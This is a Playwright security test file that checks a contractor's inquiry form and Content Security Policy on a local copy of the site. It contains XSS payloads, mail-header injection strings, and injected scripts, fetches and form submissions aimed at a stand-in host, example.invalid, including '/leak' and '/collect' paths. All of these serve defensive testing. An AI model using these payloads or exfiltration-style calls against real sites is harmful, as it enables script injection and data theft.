"""Defensive tests on our own page. External attack destinations are .invalid and intercepted."""
from pathlib import Path
from urllib.parse import urlsplit,parse_qs
import sys,json,re
from playwright.sync_api import sync_playwright,expect

BASE=sys.argv[1] if len(sys.argv)>1 else 'http://127.0.0.1:8181/'
OUT=Path(__file__).resolve().parents[1]/'.local/security';OUT.mkdir(parents=True,exist_ok=True)
payloads=[
    '<img src=x onerror="window.__xss=1">',
    '<svg/onload=window.__xss=1>',
    '</textarea><script>window.__xss=1</script>',
    '\"><input autofocus onfocus="window.__xss=1">',
    'javascript:window.__xss=1',
    '&bcc=attacker@example.invalid&subject=changed#fragment',
    '\r\nBcc: attacker@example.invalid\r\n',
    'Zażółć gęślą jaźń 🏗️ & < > " \'',
]
with sync_playwright() as p:
    browser=p.chromium.launch(channel='msedge',headless=True)
    context=browser.new_context(viewport={'width':390,'height':844})
    page=context.new_page();errors=[];requests=[]
    page.on('pageerror',lambda error:errors.append(str(error)))
    page.on('request',lambda request:requests.append(request.url))
    page.add_init_script("window.cspViolations=[];document.addEventListener('securitypolicyviolation',e=>cspViolations.push({directive:e.effectiveDirective,blocked:e.blockedURI}));")
    page.goto(BASE,wait_until='networkidle')
    assert page.evaluate('cspViolations')==[], page.evaluate('cspViolations')
    page.locator('#inquiry-service').select_option('bruk');page.locator('#form-next').click()
    for payload in payloads:
        page.locator('#location').fill('Niedźwiedź')
        page.locator('#scope').fill(payload[:80])
        page.locator('#description').fill(payload)
        page.locator('#form-next').click()
        expect(page.locator('[data-step="2"]')).to_be_visible()
        text=page.locator('#inquiry-summary').text_content()
        assert payload.strip() in text
        assert page.locator('#inquiry-summary script,#inquiry-summary img,#inquiry-summary svg,#inquiry-summary input').count()==0
        assert page.evaluate('window.__xss||0')==0
        email=urlsplit(page.locator('#mail-inquiry').get_attribute('href'))
        assert email.scheme=='mailto' and email.path=='biuro@teamsouth.pl'
        assert set(parse_qs(email.query))=={'subject','body'}
        assert parse_qs(email.query)['body'][0]==text
        wa=urlsplit(page.locator('#whatsapp-inquiry').get_attribute('href'))
        assert wa.netloc=='wa.me' and wa.path=='/48797559814' and set(parse_qs(wa.query))=={'text'}
        assert parse_qs(wa.query)['text'][0]==text
        page.locator('#form-back').click()
    page.evaluate("document.querySelector('#description').value=String.fromCharCode(0xd800)+' test';document.querySelector('#description').dispatchEvent(new Event('input'))")
    page.locator('#form-next').click()
    expect(page.locator('[data-step="2"]')).to_be_visible()
    assert '\ufffd test' in page.locator('#inquiry-summary').text_content()
    page.locator('#form-back').click()
    page.evaluate("document.querySelector('#description').value='x'.repeat(801);document.querySelector('#description').dispatchEvent(new Event('input'))")
    page.locator('#form-next').click()
    expect(page.locator('[data-step="1"]')).to_be_visible()
    page.locator('#form-reset').click()
    page.locator('#inquiry-service').select_option('bruk');page.locator('#form-next').click();page.locator('#location').fill('Testowo');page.locator('#form-next').click()
    expect(page.locator('[data-step="2"]')).to_be_visible()
    assert not errors,errors
    assert not [url for url in requests if urlsplit(url).netloc!=urlsplit(BASE).netloc]
    assert page.evaluate('localStorage.length+sessionStorage.length')==0
    print('PASS input attacks: XSS corpus, header/query injection, Unicode, hard limits, reset and no exfiltration/storage.')

    unexpected=[]
    context.route('https://example.invalid/**',lambda route:(unexpected.append(route.request.url),route.abort()))
    context.route('**/not-allowed.js',lambda route:(unexpected.append(route.request.url),route.abort()))
    before=page.url
    page.evaluate('''() => {
      const inline=document.createElement('script');inline.textContent='window.__inlineExecuted=1';document.body.append(inline);
      const external=document.createElement('script');external.src='https://example.invalid/payload.js';document.body.append(external);
      const sameOrigin=document.createElement('script');sameOrigin.src=new URL('not-allowed.js',location.href).href;document.body.append(sameOrigin);
      const image=new Image();image.src='https://example.invalid/leak?data=test';document.body.append(image);
      const frame=document.createElement('iframe');frame.src='https://example.invalid/frame';document.body.append(frame);
      const base=document.createElement('base');base.href='https://example.invalid/';document.head.append(base);
      fetch('https://example.invalid/collect').catch(()=>{});
      const form=document.querySelector('#inquiry-form');form.action='https://example.invalid/collect';form.submit();
    }''')
    page.wait_for_function("cspViolations.some(v=>v.directive==='form-action') && cspViolations.some(v=>v.directive==='connect-src') && cspViolations.some(v=>v.directive==='base-uri')")
    violations=page.evaluate('cspViolations')
    assert page.url==before and page.evaluate('window.__inlineExecuted||0')==0
    assert urlsplit(page.evaluate('document.baseURI')).netloc==urlsplit(BASE).netloc
    assert not unexpected,unexpected
    assert {'script-src-elem','img-src','frame-src','connect-src','base-uri','form-action'}<={v['directive'] for v in violations},violations
    print('PASS active CSP: blocked inline/external/same-origin unknown scripts, image/frame leaks, connections, base changes and native submission.')
    context.close()

    tamper=browser.new_context(viewport={'width':390,'height':844})
    clean_page=tamper.new_page()
    def tampered_script(route):
        response=route.fetch();route.fulfill(response=response,body=response.body()+b'\nwindow.__tampered=1;')
    tamper.route('**/app.js?*',tampered_script)
    clean_page.goto(BASE,wait_until='networkidle')
    assert clean_page.evaluate('window.__tampered||0')==0
    assert clean_page.locator('html').get_attribute('class')=='no-js'
    expect(clean_page.locator('.inquiry-form')).to_be_hidden()
    expect(clean_page.locator('.planner>.script-fallback')).to_be_visible()
    expect(clean_page.locator('#kalkulator>.script-fallback')).to_be_visible()
    expect(clean_page.locator('.estimate-layout')).to_be_hidden()
    expect(clean_page.locator('.phone')).to_be_visible()
    tamper.close()
    print('PASS tampered JavaScript: SRI rejects modified bytes; contact remains available and form fails closed.')

    fault=browser.new_context(viewport={'width':1440,'height':1000});fault_page=fault.new_page()
    fault_page.goto(BASE,wait_until='networkidle')
    target=fault_page.locator('.gallery-card:visible .gallery-link').first
    image_url=target.get_attribute('href')
    fault.route('**/'+image_url,lambda route:route.abort())
    target.click()
    expect(fault_page.locator('#lightbox-retry')).to_be_visible()
    expect(fault_page.locator('#lightbox-status')).to_contain_text('Nie udało się')
    fault.unroute('**/'+image_url)
    fault_page.locator('#lightbox-retry').click()
    expect(fault_page.locator('#lightbox-feedback')).to_be_hidden()
    assert fault_page.locator('#lightbox-image').evaluate('(image)=>image.naturalWidth>0')
    fault_page.keyboard.press('Escape');expect(fault_page.locator('body')).not_to_have_class(re.compile(r'\bmodal-open\b'))
    fault.close();browser.close()
    print('PASS image fault: clear error, retry recovery and modal cleanup.')
    (OUT/'browser-security.json').write_text(json.dumps({'result':'PASS','payloads':len(payloads),'csp_blocked_directives':sorted({v['directive'] for v in violations}),'tampered_script':'blocked','network_image_fault':'recovered'},indent=2),encoding='utf-8')
